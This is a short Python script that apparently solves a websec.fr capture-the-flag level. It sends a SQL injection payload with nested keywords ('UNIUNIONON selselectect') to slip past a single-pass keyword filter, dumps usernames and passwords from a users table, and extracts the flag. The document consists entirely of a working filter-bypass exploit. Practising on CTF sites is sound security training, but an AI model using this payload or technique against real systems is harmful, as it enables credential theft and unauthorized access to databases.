import requests
import re

url = "https://websec.fr/level02/index.php"

data = {
    "user_id": "0 UNIUNIONON selselectect username,password FroFROMm users -- -",
    "submit": "Submit"
}

req = requests.post(url=url, data=data)
if req.status_code == 200:
    pattern = r'WEBSEC{.+}'
    match = re.search(pattern, req.text)
    if match:
        print(match.group())
    else:
        print("wrong input")
